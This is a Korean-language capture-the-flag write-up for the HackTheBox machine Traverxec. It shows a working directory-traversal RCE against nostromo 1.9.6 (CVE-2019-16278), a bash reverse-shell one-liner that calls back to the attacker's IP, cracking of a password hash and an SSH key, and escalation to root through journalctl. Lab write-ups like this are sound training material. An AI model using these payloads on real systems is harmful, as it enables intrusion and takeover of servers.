# Traverxec - HackTheBox
## Recon
```bash
sudo nmap -p 22,80 -sC -sV -vv -oA Traverxec 10.10.10.165
```
<img width="1103" height="397" alt="image" src="https://github.com/user-attachments/assets/9f3217c0-899d-415a-8766-89fd5366d084" />

- SSH(22)
- HTTP(80)

---
## HTTP
- `nmap`에서 `nostromo 1.9.6`발견.
<img width="1103" height="27" alt="image" src="https://github.com/user-attachments/assets/eb5c1f57-0ac2-4fec-b4b0-2aa0b134c4f3" />

### CVE-2019-16278
- `http_verify`함수에서 directory traversal이 발생하여 RCE가 가능한 취약점.
<img width="1228" height="470" alt="image" src="https://github.com/user-attachments/assets/1b108b09-330f-44ad-8034-6503e7f7af2f" />

<br>
<br>

- https://github.com/cancela24/CVE-2019-16278-Nostromo-1.9.6-RCE
- 페이로드에 명령어를 집어넣어서 전달하여 실행.
<img width="1103" height="395" alt="image" src="https://github.com/user-attachments/assets/b0a3a7c4-d289-466f-b4ae-65f9a50e82a2" />

<br>
<br>

- ping test.
```bash
curl -X POST 'http://traverxec.htb/.%0d./.%0d./.%0d./.%0d./bin/sh' -d 'ping 10.10.16.4'
```
<img width="1104" height="55" alt="image" src="https://github.com/user-attachments/assets/0e75a8a1-b99d-4591-a940-d417619d0cfb" />

<br>
<br>

- ping test 성공.
<img width="1104" height="196" alt="image" src="https://github.com/user-attachments/assets/ce2a7a8e-0994-4152-8413-61a0f8749679" />

<br>
<br>

- 리버스 셸 실행.
```bash
curl -X POST 'http://10.10.10.165/.%0d./.%0d./.%0d./.%0d./bin/sh' -d 'bash -c "bash -i >&/dev/tcp/10.10.16.4/80 0>&1"'
```
<img width="1104" height="77" alt="image" src="https://github.com/user-attachments/assets/1a1109f3-9ac9-4aaa-94c5-aab183f4dd83" />

<br>
<br>

- 셸 획득.
<img width="1104" height="180" alt="image" src="https://github.com/user-attachments/assets/ad630aa1-b830-4f9d-b070-65c1da40630f" />

---
## Privesc
- `/var/nostromo/conf/.htpasswd`에서 `david`의 해시 발견.
<img width="1103" height="47" alt="image" src="https://github.com/user-attachments/assets/13fc1a6f-4c76-46c5-ae75-eadc05c6debb" />

<br>
<br>

- 크래킹.
<img width="1103" height="241" alt="image" src="https://github.com/user-attachments/assets/6043e8c8-f5da-4090-bff6-f4a5fadeb371" />

<br>
<br>

- 비밀번호로 SSH와 서버 로그인을 시도하였으나 실패.
- `nhttpd.conf`파일에서 `HOMEDIRS`를 발견.
<img width="1103" height="85" alt="image" src="https://github.com/user-attachments/assets/832dc128-002e-4d85-826c-9e4f5280350d" />

<br>
<br>

- https://www.nazgul.ch/dev/nostromo_man.html
- `HTTP`에서 `~hacki` 경로로 이동하면 서버의 `/home/hacki`의 폴더를 보는 것과 같다고 한다.
<img width="696" height="343" alt="image" src="https://github.com/user-attachments/assets/42523a25-5e01-4f49-8b67-5b212662575f" />

<br>
<br>

- `~/david`경로로 이동하니 내용 확인은 불가능하나 접근은 가능.
<img width="405" height="206" alt="image" src="https://github.com/user-attachments/assets/b0ef680a-73b5-4eac-846e-a6997bbc44fc" />

<br>
<br>

- `public_www`경로가 무엇인지 감을 못잡은 상태에서 `/home/david`에서 해당 경로로 이동을 시도하여 성공.
<img width="1104" height="116" alt="image" src="https://github.com/user-attachments/assets/a1161d68-1525-4190-8a75-191336beafcb" />

<br>
<br>

- `/home/david/public_www/protected-file-area`경로에서 백업파일 발견.
<img width="1104" height="119" alt="image" src="https://github.com/user-attachments/assets/5c411f85-b2e1-48db-bd79-324a2d4d453d" />

<br>
<br>

- 로컬로 다운로드 받아서 압축을 해제하여 `id_rsa`획득.
<img width="1104" height="601" alt="image" src="https://github.com/user-attachments/assets/be244c05-f6a7-40ab-b317-1e2c91a84a1e" />

<br>
<br>

- 크래킹한 비밀번호 `Nowonly4me`를 사용하여 `id_rsa`를 가지고 로그인을 시도하였으나 실패.
- `ssh2john`으로 hash로 만들어 크래킹 진행.
```bash
ssh2john id_rsa >hash

john hash --wordlist=~/util/rockyou.txt
```
<img width="1104" height="241" alt="image" src="https://github.com/user-attachments/assets/2c951d11-e1f6-41d2-b2bc-e1ebc94010e1" />

<br>
<br>

- `david` 로그인.
```bash
ssh -i id_rsa david@10.10.10.165
```
<img width="1104" height="120" alt="image" src="https://github.com/user-attachments/assets/45d78e8f-3c86-4796-a3f1-f47c89ce6a22" />

<br>
<br>

- `/home/david/bin/server-stats.sh`스크립트 아래에 `journalctl`를 `root`권한으로 실행이 가능.
<img width="1104" height="211" alt="image" src="https://github.com/user-attachments/assets/dde479ee-8c15-4932-8b12-a11e0c5b9eee" />

<br>
<br>

- https://gtfobins.github.io/gtfobins/journalctl/
- `sudo -l`을 사용할 수 없어서 해당 스크립트를 변형하여 실행이 가능한지 생각.
- 해당 폴더는 `david`에게 모든 권한이 있음.
<img width="1104" height="117" alt="image" src="https://github.com/user-attachments/assets/73e56622-df5a-475f-af5d-d15cb6820ad0" />

<br>
<br>

- 출력하는 부분만 제거하여 `ex.sh`로 생성.
<img width="1104" height="210" alt="image" src="https://github.com/user-attachments/assets/5c313952-3a33-4ed4-9fc9-99f301472d40" />

<br>
<br>

- `!/bin/sh`를 입력하여 실행.
<img width="1104" height="477" alt="image" src="https://github.com/user-attachments/assets/90c25e3d-c6f6-4f71-b689-dfa3c8e02f7d" />

<br>
<br>

- `root` 획득.
<img width="1104" height="41" alt="image" src="https://github.com/user-attachments/assets/16b341ac-d227-4da5-b8fc-304d8a312dec" />

---
## FLAG
- `/home/david/user.txt`
<img width="1104" height="251" alt="image" src="https://github.com/user-attachments/assets/3d4b595f-9c68-4e5f-a485-babc8f46da18" />

<br>
<br>

- `/root/root.txt`
<img width="1104" height="211" alt="image" src="https://github.com/user-attachments/assets/85d58617-e8c8-4933-96a9-8a71d61dfd7d" />



















